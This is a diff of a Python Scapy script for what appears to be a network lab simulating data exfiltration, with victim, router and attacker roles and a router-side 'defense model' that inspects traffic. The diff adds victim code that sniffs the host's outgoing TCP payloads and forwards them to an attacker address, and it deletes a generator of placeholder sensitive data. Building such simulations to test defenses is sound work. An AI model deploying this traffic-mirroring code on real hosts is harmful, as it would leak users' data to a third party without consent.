@@ -15,14 +15,6 @@ from time import sleep
 # Global 
 def_model = router.DefenseModel()
 
-#victim_ip = os.environ['victim_ip']
-#attacker_ip = os.environ['attacker_ip']
-#router_ip = os.environ['router_ip']
-
-#mypkt = IP(dst=router_ip)/TCP()/Raw(load='test1')
-#r1 = send(mypkt,iface='eth1',timeout=2)
-#exit()
-
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
     print('Calling packet sniffer function.')
@@ -42,7 +34,7 @@ def send_to_router(packet):
 
     new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
-    print('Sending packet to router:', new_packet.show())
+    print('Sending packet to router')
     r1 = send(new_packet, iface='eth1')
 
 #Victim functions
@@ -54,9 +46,18 @@ def send_to_attacker(packet):
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
-    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
+    if(data.decode("utf-8").find('|ORIG_DST=' + my_ips.attacker_ip) == -1):
+        if(data.decode("utf-8").find('|ORIG_DST=') != -1):
+            test_field = "|ORIG_DST="
+            tmp_data = data.decode("utf-8").partition(test_field)
+            if(tmp_data[2].find('|') != -1):
+                replacement_data = tmp_data[0] + tmp_data[2][tmp_data[2].find('|'):]
+            else:
+                replacement_data = tmp_data[0]
+            data = replacement_data.encode("utf-8")
+        new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
 
-    send_to_router(new_packet)
+        send_to_router(new_packet)
 #---
 
 #Router functions
@@ -84,20 +85,18 @@ def reroute_packet(packet):
     #Get destination address that was embedded in the payload
     dst_addr = get_packet_destination(data)
         
-    # IP address is always the first in the list 
-    
+    if(dst_addr != -1):
+        # Source = hardcoded router's IP address 
+        forwarded_packet[IP].src = get_if_addr('eth1')
+        forwarded_packet[IP].dst = dst_addr
         
-    # Source = hardcoded router's IP address 
-    forwarded_packet[IP].src = get_if_addr('eth1')
-    forwarded_packet[IP].dst = dst_addr
-        
-    forwarded_packet[TCP].sport = packet[TCP].sport
-    forwarded_packet[IP].dport = packet[TCP].dport
+        forwarded_packet[TCP].sport = packet[TCP].sport
+        forwarded_packet[TCP].dport = packet[TCP].dport
 
-    print('Forwarded packet:', forwarded_packet.show())
-    r1 = send(forwarded_packet, iface='eth1')
+        print('Forwarded packet')
+        r1 = send(forwarded_packet, iface='eth1')
 
-    defense_model(forwarded_packet)
+        defense_model(forwarded_packet)
 
 def defense_model(packet):
     print('Getting packet IP')
@@ -115,9 +114,6 @@ def defense_model(packet):
         def_model.print_contents_of_packet_dictionary()
 
 
-
-
-
 #Parses payload to get the true desination address of the packet.
 #Needed to implement a 'router' that has the defense model.
 def get_packet_destination(data):
@@ -129,14 +125,11 @@ def get_packet_destination(data):
     # end info = information after the main payload 
     end_info = data.partition(test_field)[2] 
     if(end_info == ''):
-        print(end_info)
-        print(data)
-        return '1.1.1.1';
+        return -1;
                                                          
     # Split the end substring by | delimiter 
     end_list = end_info.split('|')
     
-    print(end_list[0])
     return end_list[0]
 
 #---
@@ -145,6 +138,7 @@ def get_packet_destination(data):
 #---
 
 def log_packet(packet):
+    print('help me!')
     if packet.show() is None:
         print('logging packet')
         f = open('log_file.txt', 'a')
@@ -165,51 +159,18 @@ def log_packet(packet):
 
 #---
 
-# Simulate external host that sends randomized packets
-def build_packet(external_host_ip, external_ip):
-    RANDOMIZED_WORDS = ['This', 'packet', 'sentence', 'password', 'username', 
-            'advertisement', 'confidential', 'urgent', 'email', 'facebook', 'twitter',
-            'linkedin', 'important', 'details', 'about', 'this', 'warranty', 
-            'family', 'colleague', 'low', 'priority', 'social', 'security', 'number',
-            'is', '555-55-5555', 'credit', 'card', 'number', 'is', '4444-4444-4444-4444', 
-            'bank', 'account', 'number', 'is', '1234567', 'routing', 'number', 'is', 
-            '2222222']
-
-    # Generate a payload with a string of 10 randomized characters
-    MAX = 10
-    payload_string = ''
-    # Loop through 10 times to randomly select the 10 words
-    for i in range(0, MAX):
-        payload_string += RANDOMIZED_WORDS[randint(0, len(RANDOMIZED_WORDS) - 1)]
-        if i != MAX - 1:
-            payload_string += ' '
-
-    
-    attacker_packet = IP(dst=my_ips.router_ip)/TCP(dport=80)/Raw(load=payload_string)
-
-    send_to_attacker(attacker_packet)
-    
-    # Append the original victim destination at end of payload
-
-    packet = IP(src=external_host_ip, dst=external_ip)/TCP(dport=80)/Raw(load=payload_string)
-    send_to_router(packet)
-
-def send_packet(packet):
-    print('Sending external packet')
-    r1 = send(packet, iface='eth1')
-    
-
-
-
 if __name__=='__main__':
     local_ip = get_if_addr('eth1')
-    if(role == 'xxxxx'):
-        packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
+    if(local_ip == my_ips.victim_ip):
+        role = 'victim'
+    elif(local_ip == my_ips.attacker_ip):
+        role = 'attacker'
+    elif(local_ip == my_ips.router_ip):
+        role = 'router'
+
+    if(role == 'victim'):
+        packet_sniffer('src host ' + local_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
     elif(role == 'router'):
         packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
-        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp', log_packet)
-    elif role == 'victim':
-        while True:
-            build_packet(my_ips.victim_ip, my_ips.external_host_ip)
-            sleep(5)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', log_packet)
